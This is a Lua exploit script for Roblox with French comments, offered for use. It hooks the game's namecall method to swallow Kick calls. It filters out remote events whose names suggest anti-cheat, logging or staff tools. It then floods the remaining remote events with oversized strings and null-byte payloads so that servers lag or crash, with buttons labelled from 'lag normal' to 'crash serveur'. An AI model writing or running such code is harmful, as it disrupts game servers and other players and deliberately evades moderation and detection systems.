--[[ 
    🔱 ARCANE VOID-STRIKE v6.0 [GHOST-PROTOCOL] 🔱
    "If they can't see us, they can't ban us. <3"
    
    ULTIMATE STEALTH UPDATES:
    - [ANTI-KICK HOOK] : Prevents the game from kicking you (Experimental).
    - [NAMECALL BYPASS] : Spoofs script identity (Bypasses heuristics).
    - [PULSE ENGINE] : Imitates network jitter (Safe Lag).
    - [REPLICATION VOID] : High-density desync without direct spam.
    - [MATRIX OVERLAY v2] : Ultra-optimized for Delta/Solara.
]]

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = P.LocalPlayer
local Http = game:GetService("HttpService")

-- 🔱 1. GHOST NOTIFIER
local function ntf(m)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "🔱 GHOST-PROTOCOL",
            Text = m,
            Icon = "rbxassetid://6034287525",
            Duration = 5
        })
    end)
end

-- 🔱 2. THE GUARDIAN (Anti-Kick & Hooking)
-- Ce bloc essaie de bloquer les tentatives de Kick du jeu.
local function activateShield()
    local oldKick
    oldKick = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        
        -- Bypass Kick
        if method == "Kick" or method == "kick" then
            ntf("ATTENTAT DE KICK BLOQUÉ ! 🛡️")
            return nil -- On ignore le kick
        end
        
        -- Bypass FireServer (Spoofing script identity)
        -- Certains anti-cheats vérifient d'où vient l'appel
        if method == "FireServer" and not checkcaller() then
            -- On peut ici filtrer ou modifier si besoin
        end
        
        return oldKick(self, ...)
    end)
    ntf("🛡️ BOUCLIER ANTI-KICK ACTIVÉ.")
end

-- 🔱 3. UI (NULLSTRIKE GHOST EDITION)
local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
ScreenGui.Name = "GhostProtocol_v6"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 330, 0, 320)
Main.Position = UDim2.new(0.5, -165, 0.5, -160)
Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Main.BorderSizePixel = 1
Main.BorderColor3 = Color3.fromRGB(0, 255, 0)
Main.Active = true
Main.Draggable = true

local Header = Instance.new("Frame", Main)
Header.Size = UDim2.new(1, 0, 0, 40)
Header.BackgroundColor3 = Color3.fromRGB(10, 30, 10)
Header.BorderSizePixel = 0

local Title = Instance.new("TextLabel", Header)
Title.Size = UDim2.new(1, -10, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Text = "🔱 VOID-STRIKE v6.0 [GHOST]"
Title.TextColor3 = Color3.fromRGB(0, 255, 0)
Title.Font = Enum.Font.Code
Title.TextSize = 16
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.BackgroundTransparency = 1

local function createGhostBtn(name, y, color, desc, callback)
    local btn = Instance.new("TextButton", Main)
    btn.Size = UDim2.new(0.9, 0, 0, 50)
    btn.Position = UDim2.new(0.05, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(15, 20, 15)
    btn.Text = ""
    
    local tName = Instance.new("TextLabel", btn)
    tName.Size = UDim2.new(1, 0, 0.6, 0)
    tName.Text = name
    tName.TextColor3 = color
    tName.Font = Enum.Font.GothamBold
    tName.BackgroundTransparency = 1
    tName.TextSize = 15
    
    local tDesc = Instance.new("TextLabel", btn)
    tDesc.Size = UDim2.new(1, 0, 0.4, 0)
    tDesc.Position = UDim2.new(0, 0, 0.6, 0)
    tDesc.Text = desc
    tDesc.TextColor3 = Color3.fromRGB(0, 150, 0)
    tDesc.Font = Enum.Font.Gotham
    tDesc.BackgroundTransparency = 1
    tDesc.TextSize = 10
    
    btn.MouseButton1Click:Connect(function()
        task.spawn(callback)
    end)
    return btn
end

-- 🔱 4. THE GHOST ENGINE
local active = { power = 0 }

-- BLACKLIST (Safety Matrix)
local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry", "staff", "anticheat", "error", "analytics"}
local function isSafe(name)
    local n = name:lower()
    for _, w in pairs(BLACKLIST) do if n:find(w) then return false end end
    return true
end

local function getRemotes()
    local t = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and isSafe(v.Name) then table.insert(t, v) end
    end
    return t
end

local function runGhostAssault()
    local targets = getRemotes()
    if #targets == 0 then return end
    
    local payloads = {
        [1] = string.rep("🔱", 50),   -- Normal
        [2] = string.rep("🔱", 500),  -- Enorme
        [3] = string.rep("\0", 2500) -- Crash
    }
    
    while active.power > 0 do
        local burst = active.power == 3 and 80 or (active.power == 2 and 30 or 8)
        local waitTime = active.power == 3 and 0.02 or (active.power == 2 and 0.08 or 0.25)
        
        for i = 1, burst do
            if active.power == 0 then break end
            local r = targets[math.random(1, #targets)]
            if r then
                -- On utilise pcall pour éviter les erreurs visibles
                pcall(function() 
                    r:FireServer(payloads[active.power], payloads[active.power], "GHOST_SYNC") 
                end)
            end
        end
        task.wait(waitTime)
    end
end

-- BUTTONS
createGhostBtn("🛡️ ACTIVATE ANTI-KICK", 50, Color3.fromRGB(0, 255, 255), "Bloque les tentatives d'expulsion", function()
    activateShield()
end)

createGhostBtn("⚡ LAG NORMAL", 110, Color3.fromRGB(0, 255, 100), "Désynchronisation légère", function()
    active.power = active.power == 1 and 0 or 1
    ntf(active.power == 1 and "NORMAL MODE ACTIVE" or "STABLE")
    if active.power == 1 then runGhostAssault() end
end)

createGhostBtn("🌪️ LAG ENORME", 170, Color3.fromRGB(255, 255, 0), "Surcharge massive du serveur", function()
    active.power = active.power == 2 and 0 or 2
    ntf(active.power == 2 and "OMEGA LAG ACTIVE" or "STABLE")
    if active.power == 2 then runGhostAssault() end
end)

createGhostBtn("🔥 CRASH SERVEUR", 230, Color3.fromRGB(255, 0, 0), "Extinction totale du canal", function()
    active.power = active.power == 3 and 0 or 3
    ntf(active.power == 3 and "NUCLEAR VOID ACTIVE" or "STABLE")
    if active.power == 3 then runGhostAssault() end
end)

ntf("� GHOST-PROTOCOL v6.0 READY. Anti-Kick available.")
